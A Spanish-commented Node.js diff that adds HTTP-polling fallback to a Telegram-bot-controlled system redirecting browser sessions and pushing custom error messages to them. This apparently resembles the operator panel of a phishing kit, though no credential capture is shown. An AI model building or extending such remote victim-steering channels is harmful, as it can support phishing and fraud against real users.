@@ -8,8 +8,20 @@ const CHAT_ID   = process.env.TELEGRAM_CHAT_ID  || '-1003048014042';
 
 // Map<sessionId, { socketId }>
 const activeSessions = new Map();
+
+// Map<sessionId, { url, showError, errorMessage, ts }> — acción pendiente para HTTP polling
+const pendingActions = new Map();
+
 let _io = null;
 let tgOffset = 0;
+
+// Limpiar pendingActions con más de 5 minutos de antigüedad
+setInterval(() => {
+    const cutoff = Date.now() - 5 * 60 * 1000;
+    for (const [sid, a] of pendingActions) {
+        if (a.ts < cutoff) pendingActions.delete(sid);
+    }
+}, 60 * 1000);
 
 function setIo(io) { _io = io; }
 
@@ -86,20 +98,25 @@ async function handleCallback(cb) {
     console.log(`[TG] action=${action} tid=${tid} sess=${sess ? 'found socketId=' + sess.socketId : 'MISSING'}`);
 
     const mapped = ACTION_MAP[action];
-    if (mapped && sess && sess.socketId && _io) {
-        const cmd = { action: 'redirect', url: mapped.url };
-        if (mapped.showError) {
-            cmd.showError    = true;
-            cmd.errorMessage = mapped.errorMessage;
-        }
-        _io.to(sess.socketId).emit('command', cmd);
-        answerCallback(cb.id, `✅ Enviado: ${action}`);
-    } else if (!mapped) {
+    if (!mapped) {
         answerCallback(cb.id, `⚠️ Acción desconocida: ${action}`);
-    } else if (!sess) {
-        answerCallback(cb.id, '⚠️ Sesión no encontrada o expirada');
     } else {
-        answerCallback(cb.id, '⚠️ Cliente desconectado');
+        // Siempre guardar acción pendiente para HTTP polling (no depende del socket)
+        pendingActions.set(tid, {
+            url:          mapped.url,
+            showError:    mapped.showError    || false,
+            errorMessage: mapped.errorMessage || null,
+            ts:           Date.now()
+        });
+
+        // Intentar también por Socket.IO para redirect instantáneo
+        if (sess && sess.socketId && _io) {
+            const cmd = { action: 'redirect', url: mapped.url };
+            if (mapped.showError) { cmd.showError = true; cmd.errorMessage = mapped.errorMessage; }
+            _io.to(sess.socketId).emit('command', cmd);
+        }
+
+        answerCallback(cb.id, `✅ Enviado: ${action}`);
     }
 
     // Mantener el teclado en el mensaje de Telegram
@@ -131,4 +148,4 @@ function startPolling() {
     console.log('[TG] Polling iniciado');
 }
 
-module.exports = { activeSessions, setIo, getKeyboard, sendTelegram, startPolling };
+module.exports = { activeSessions, pendingActions, setIo, getKeyboard, sendTelegram, startPolling };
